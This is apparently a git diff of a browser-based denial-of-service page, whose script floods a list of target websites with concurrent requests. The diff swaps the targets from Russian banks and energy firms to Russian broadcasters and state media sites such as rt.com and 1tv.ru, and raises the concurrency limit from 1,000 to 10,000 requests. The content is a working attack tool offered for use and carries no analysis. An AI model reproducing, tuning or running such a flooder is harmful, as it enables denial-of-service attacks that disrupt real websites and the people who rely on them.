@@ -116,62 +116,57 @@
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://www.cbr.ru/</td>
+                        <td>http://rutv.ru//</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://lukoil.com/</td>
+                        <td>https://ntv.ru/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://www.gazprom.ru</td>
+                        <td>https://www.vgtrk.com/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>http://nlmk.com/</td>
+                        <td>https://russia.tv/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://www.tektorg.ru/</td>
+                        <td>https://tvkultura.ru/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://b2b.sibur.ru/</td>
+                        <td>https://www.1tv.ru/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://enter.unicredit.ru/</td>
+                        <td>https://www.1tvrus.com/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>http://www.vgtrk.com/</td>
+                        <td>https://www.rt.com/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://er.ru/</td>
+                        <td>https://live.russia.tv/channel/3</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://ldpr.ru</td>
+                        <td>https://sputniknews.com/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
                     <tr>
-                        <td>https://tokyo.mid.ru/</td>
-                        <td>0</td>
-                        <td>0</td>
-                    </tr>
-                    <tr>
-                        <td>https://kprf.ru/</td>
+                        <td>https://ldpr.ru/</td>
                         <td>0</td>
                         <td>0</td>
                     </tr>
@@ -182,18 +177,17 @@
         <script>
         var targets = [
             'https://ddos-guard.net/',
-            'https://www.cbr.ru/',
-            'https://lukoil.com/',
-            'https://www.gazprom.ru',
-            'https://nlmk.com/',
-            'https://www.tektorg.ru/',
-            'https://b2b.sibur.ru/',
-            'https://enter.unicredit.ru/',
+            'https://rutv.ru/',
+            'https://ntv.ru/',
             'https://www.vgtrk.com/',
-            'https://er.ru/',
-            'https://ldpr.ru/',
-            'https://tokyo.mid.ru/',
-            'https://kprf.ru/'
+            'https://russia.tv/',
+            'https://tvkultura.ru/',
+            'https://www.1tv.ru/',
+            'https://www.1tvrus.com/',
+            'https://www.rt.com/',
+            'https://live.russia.tv/channel/3',
+            'https://sputniknews.com/',
+            'https://ldpr.ru/'
         ]
         
         var targetStats = {}
@@ -207,7 +201,7 @@
         }
         setInterval(printStats, 200);
         
-        var CONCURRENCY_LIMIT = 1000
+        var CONCURRENCY_LIMIT = 10000
         var queue = []
         
         async function fetchWithTimeout(resource, options) {
